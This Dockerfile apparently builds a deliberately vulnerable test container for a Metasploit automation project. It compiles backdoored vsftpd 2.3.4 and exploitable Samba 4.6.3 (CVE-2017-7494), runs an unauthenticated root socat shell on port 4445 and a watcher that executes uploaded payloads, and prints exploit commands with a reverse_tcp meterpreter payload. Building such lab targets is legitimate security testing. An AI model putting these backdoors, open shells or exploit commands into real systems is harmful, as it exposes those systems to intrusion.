# =============================================================================
# Assassinate Test Target Container
# =============================================================================
#
# This container runs vulnerable services for integration testing.
# It provides real session targets for testing Meterpreter/shell operations.
#
# Vulnerable Services:
#   - vsftpd 2.3.4 (CVE-2011-2523) - backdoor on port 6200 (ONE-TIME per container)
#   - Samba 4.6.3 (CVE-2017-7494) - RCE on port 445 (REPEATABLE)
#   - socat shell listener on port 4445 (direct shell, not an exploit)
#
# Exploit Behavior:
#   - vsftpd: Backdoor fires ONCE per container lifecycle
#   - Samba: Can be exploited UNLIMITED times (uploads .so payload each time)
#
# Usage:
#   docker compose -f docker/docker-compose.yml build target-linux
#   docker compose -f docker/docker-compose.yml up target-linux
#
# =============================================================================

# =============================================================================
# Stage 1: Build vsftpd (Ubuntu 16.04 for library compatibility)
# =============================================================================
FROM ubuntu:16.04 AS vsftpd-builder

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y --no-install-recommends \
    build-essential \
    wget \
    ca-certificates \
    libcap-dev \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /build

RUN wget -q https://github.com/nikdubois/vsftpd-2.3.4-infected/archive/refs/heads/master.tar.gz -O vsftpd-infected.tar.gz \
    || wget -q https://github.com/DoctorKisow/vsftpd-2.3.4/archive/refs/heads/master.tar.gz -O vsftpd-infected.tar.gz \
    || wget -q https://github.com/lyndon160/vsftpd-backdoor/archive/refs/heads/master.tar.gz -O vsftpd-infected.tar.gz

RUN tar xzf vsftpd-infected.tar.gz && \
    SRCDIR=$(ls -d vsftpd-* | head -1) && \
    echo "Building vsftpd from $SRCDIR" && \
    cd "$SRCDIR" && \
    sed -i 's/^LIBS\s*=.*/LIBS = -lcrypt -lcap/' Makefile && \
    make && \
    cp vsftpd /build/vsftpd

# =============================================================================
# Stage 2: Build Samba 4.6.3 (Ubuntu 16.04 - matches vulhub)
# =============================================================================
FROM ubuntu:16.04 AS samba-builder

ENV DEBIAN_FRONTEND=noninteractive

RUN set -ex \
    && echo "krb5-config krb5-config/default_realm string " | debconf-set-selections \
    && apt-get update \
    && apt-get install -y wget build-essential autoconf acl attr bison \
       debhelper dnsutils docbook-xml docbook-xsl flex gdb krb5-user \
       libacl1-dev libaio-dev libattr1-dev libblkid-dev libbsd-dev \
       libcap-dev libcups2-dev libgnutls28-dev libjson-perl \
       libldap2-dev libncurses5-dev libpam0g-dev libparse-yapp-perl \
       libpopt-dev libreadline-dev pkg-config perl perl-modules \
       python-all-dev python-dev python-dnspython python-crypto \
       xsltproc zlib1g-dev libsystemd-dev libgpgme11-dev python-gpgme python-m2crypto \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /build

RUN wget -q https://download.samba.org/pub/samba/stable/samba-4.6.3.tar.gz -O samba.tar.gz \
    && tar xzf samba.tar.gz \
    && cd samba-4.6.3 \
    && ./configure --prefix=/usr/local/samba \
    && make -j$(nproc) \
    && make install DESTDIR=/build/samba-install

# =============================================================================
# Runtime Stage (Ubuntu 16.04 - same as Samba build for library compatibility)
# =============================================================================

FROM ubuntu:16.04

LABEL maintainer="Assassinate Project"
LABEL description="Vulnerable test target for Assassinate integration tests"
LABEL security.warning="DO NOT expose this container to untrusted networks"

ENV DEBIAN_FRONTEND=noninteractive

# Install runtime dependencies (matching Ubuntu 16.04 libraries for Samba 4.6.3)
RUN apt-get update && apt-get install -y --no-install-recommends \
    netcat-openbsd \
    procps \
    iproute2 \
    iputils-ping \
    curl \
    socat \
    supervisor \
    libcap2 \
    libpam0g \
    libpopt0 \
    libacl1 \
    libattr1 \
    libgnutls30 \
    libldap-2.4-2 \
    libjansson4 \
    libtalloc2 \
    libtevent0 \
    libtdb1 \
    libcups2 \
    libavahi-client3 \
    libavahi-common3 \
    libaio1 \
    python \
    && rm -rf /var/lib/apt/lists/*

# Create users and directories
RUN useradd -m -s /bin/bash ftpuser \
    && echo "ftpuser:ftpuser" | chpasswd \
    && useradd -r -s /sbin/nologin ftp \
    && useradd -r -s /sbin/nologin samba \
    && mkdir -p /var/ftp/pub \
    && chown -R ftp:ftp /var/ftp \
    && mkdir -p /var/run/vsftpd/empty \
    && mkdir -p /var/log/samba \
    && mkdir -p /var/lib/samba/private \
    && mkdir -p /var/run/samba \
    && mkdir -p /home/share \
    && chmod 777 /home/share

# Copy vsftpd from builder
COPY --from=vsftpd-builder /build/vsftpd /usr/local/sbin/vsftpd

# Copy entire Samba installation from builder
COPY --from=samba-builder /build/samba-install/usr/local/samba /usr/local/samba

# Add Samba to PATH
ENV PATH="/usr/local/samba/bin:/usr/local/samba/sbin:${PATH}"

# Create vsftpd config
RUN cat > /etc/vsftpd.conf << 'EOF'
listen=YES
listen_port=21
anonymous_enable=YES
anon_root=/var/ftp
local_enable=YES
write_enable=YES
pam_service_name=vsftpd
secure_chroot_dir=/var/run/vsftpd/empty
background=NO
EOF

# Create PAM config for vsftpd
RUN cat > /etc/pam.d/vsftpd << 'EOF'
auth    required pam_unix.so
account required pam_unix.so
EOF

# Create Samba config for CVE-2017-7494 (is_known_pipename)
# The vulnerability requires a writeable share - the exploit uploads a .so and triggers loading
RUN cat > /usr/local/samba/etc/smb.conf << 'EOF'
[global]
   workgroup = WORKGROUP
   server string = Samba 4.6.3
   netbios name = TARGET

   # Guest access for anonymous exploitation
   map to guest = Bad User
   guest account = nobody

   # Logging
   log file = /var/log/samba/log.%m
   max log size = 1000

[myshare]
   comment = Writeable share for CVE-2017-7494
   path = /home/share
   read only = no
   guest ok = yes
   guest only = yes
   browseable = yes
EOF

# Create payload watcher script
RUN cat > /usr/local/bin/payload-watcher.sh << 'WATCHER_EOF'
#!/bin/bash
echo "[payload-watcher] Started, watching /payload/trigger"

while true; do
    if [ -f /payload/trigger ]; then
        echo "[payload-watcher] Trigger detected!"
        rm -f /payload/trigger

        for payload in /payload/*.elf; do
            if [ -f "$payload" ]; then
                echo "[payload-watcher] Executing: $payload"
                chmod +x "$payload"
                nohup "$payload" > /var/log/payload-$(basename "$payload").log 2>&1 &
                echo "[payload-watcher] Payload started with PID: $!"
            fi
        done
    fi
    sleep 1
done
WATCHER_EOF
RUN chmod +x /usr/local/bin/payload-watcher.sh

# Create supervisor config
RUN cat > /etc/supervisor/conf.d/services.conf << 'EOF'
[supervisord]
nodaemon=true
user=root
logfile=/var/log/supervisord.log
pidfile=/var/run/supervisord.pid

[program:vsftpd]
command=/usr/local/sbin/vsftpd /etc/vsftpd.conf
autostart=true
autorestart=true
stdout_logfile=/var/log/vsftpd.log
stderr_logfile=/var/log/vsftpd.err
priority=10

[program:smbd]
command=/usr/local/samba/sbin/smbd -F -S
autostart=true
autorestart=true
stdout_logfile=/var/log/smbd.log
stderr_logfile=/var/log/smbd.err
priority=15

[program:shell-listener]
command=/usr/bin/socat TCP-LISTEN:4445,fork,reuseaddr EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
autostart=true
autorestart=true
stdout_logfile=/var/log/shell-listener.log
stderr_logfile=/var/log/shell-listener.err
priority=20

[program:payload-watcher]
command=/usr/local/bin/payload-watcher.sh
autostart=true
autorestart=true
stdout_logfile=/var/log/payload-watcher.log
stderr_logfile=/var/log/payload-watcher.err
priority=30
EOF

# Create payload directory
RUN mkdir -p /payload

# Create health check script
RUN cat > /usr/local/bin/healthcheck.sh << 'EOF'
#!/bin/bash
pgrep vsftpd > /dev/null || exit 1
pgrep socat > /dev/null || exit 1
# smbd may fail to start if Samba build failed, don't block on it
exit 0
EOF
RUN chmod +x /usr/local/bin/healthcheck.sh

# Create startup script
RUN cat > /usr/local/bin/start.sh << 'EOF'
#!/bin/bash
echo "==================================="
echo "Assassinate Test Target Container"
echo "==================================="
echo ""
echo "Services:"
echo "  - vsftpd 2.3.4 (CVE-2011-2523): port 21 (backdoor opens 6200) [ONE-TIME]"
echo "  - Samba 4.6.3 (CVE-2017-7494):  port 445 [REPEATABLE]"
echo "  - Shell listener (socat):       port 4445"
echo "  - Payload watcher:              executes /payload/*.elf on trigger"
echo ""
echo "Exploit Commands:"
echo ""
echo "  vsftpd (fires ONCE per container restart):"
echo "    use exploit/unix/ftp/vsftpd_234_backdoor"
echo "    set RHOSTS target-linux"
echo "    exploit"
echo ""
echo "  Samba (REPEATABLE - use for test chains):"
echo "    use exploit/linux/samba/is_known_pipename"
echo "    set RHOSTS target-linux"
echo "    set SMB_SHARE_NAME myshare"
echo "    set PAYLOAD linux/x64/meterpreter/reverse_tcp"
echo "    set LHOST <your-ip>"
echo "    exploit"
echo ""
echo "Starting services..."
exec /usr/bin/supervisord -c /etc/supervisor/supervisord.conf
EOF
RUN chmod +x /usr/local/bin/start.sh

# Expose ports
# 21: FTP (vsftpd)
# 139: SMB (NetBIOS)
# 445: SMB (Direct)
# 4445: Pre-configured shell listener
# 6200: vsftpd backdoor shell
EXPOSE 21 139 445 4445 6200

HEALTHCHECK --interval=10s --timeout=5s --retries=3 \
    CMD /usr/local/bin/healthcheck.sh

USER root

ENTRYPOINT ["/usr/local/bin/start.sh"]
